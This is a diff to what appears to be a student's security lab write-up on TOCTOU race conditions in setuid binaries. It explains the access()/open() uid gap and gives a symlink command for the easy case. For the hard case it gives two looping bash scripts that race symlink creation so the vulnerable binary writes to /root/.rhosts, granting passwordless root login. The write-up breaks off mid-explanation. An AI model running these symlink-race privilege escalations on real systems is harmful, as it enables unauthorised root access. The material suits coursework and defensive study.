@@ -93,7 +93,7 @@ Results after removing ACL entries:
 > find /A2/Gotham/ -type d -exec getfacl {} \; 
 ```
 
-## Part C - Race Conditions - TOCTOU 
+## Part C - Race Conditions - Privilige escalation using TOCTOU 
 
 ### Slow (Easy difficulty) 
 ```diff 
@@ -202,6 +202,8 @@ It seems like the binary is trying to check write permission using ```access()``
 
 During the time when binary is sleeping, what if we create a symlink from ```.debug_log``` to ```root_file```. The binary cannot assume the state managed by the operating system will not change between system calls. This is why we are able to exploit the vulnurability using external input. 
 
+In addition to this, the open() does not check for real user id (real user id here is ```student```). open() syscall checks for effective user id. Effective user id here is ```root``` because the setuid bit is set. Effective uid is used to denote access levels for the process in execution. If setuid bit is set, effective uid is set to uid of the owner of the file (which is ```root``` in this case). Thus, when open() checks for access rights to ```root_file```, we have the priviliges. 
+
 The exploitation process is: 
 - Run the binary using command ```./vuln_slow 60 hacked_by_anon```. It should be in sleep for 60 seconds. 
 - During these 60 seconds, run ```ln -s /A2/Racing/Slow/root_file /home/student/.debug_log``` in a separate terminal
@@ -213,5 +215,47 @@ The exploitation process is:
 SUCCESS! 
 
 ```diff
-- NOTE: path to directories might change for you. It might not be /A2/Racing/Slow for root_file and /home/student/ for .debug_log file
+- NOTE: path to directories might change for you. It might not be /A2/Racing/Slow for root_file and /home/student/ for .debug_log file. 
+- You might need to create a student directory in home/ 
 ```
+
+### Fast (hard difficulty) 
+
+We are given ```vuln_fast``` binary that is modified to no longer accept a sleep argument. Since the vulnerability in this program does not occur after a configurable sleep we will only be able to exploit it in a probabilistic fashion by automated means. In order to aid you in this task we are provided with two skeleton bash scripts to modify: ```vuln.sh``` and ```exploit.sh```
+
+Our objective for this part is to gain access to the root user by exploiting the vuln_fast program to add our username to the root user's .rhosts file to allow passwordless login using the rsh and rlogin commands.
+
+This is how I modify ```vuln.sh```: 
+
+```bash
+#!/bin/bash
+
+DEBUG_FILE=/home/student/.debug_log
+
+rm $DEBUG_FILE
+
+while true
+do
+  nice -n 20 ./vuln_fast "localhost student"
+done
+```
+
+This is my ```exploit.sh```: 
+
+```bash
+#!/bin/bash
+
+DEBUG_FILE=/home/student/.debug_log
+TARGET_FILE=/root/.rhosts
+
+while true
+do
+  rm $DEBUG_FILE
+  ln -s $TARGET_FILE $DEBUG_FILE
+done
+```
+
+**EXPLOITATION PROCESS:**
+
+We are running ```vuln_fast``` multiple times in an infinite loop. Concurrently, we run another process that creates symlinks from debug file to the target file. There comes a period in the execution of both scripts where vuln_fast process (child process of ```vuln.sh```) gets past the ```access()``` system call as ```.debug_log``` is accessible by the user who spawned the process
+Then, ```exploit.sh``` removes the ```.debug_log``` file and creates a symlink to /root/.rhosts named .debug_log. 
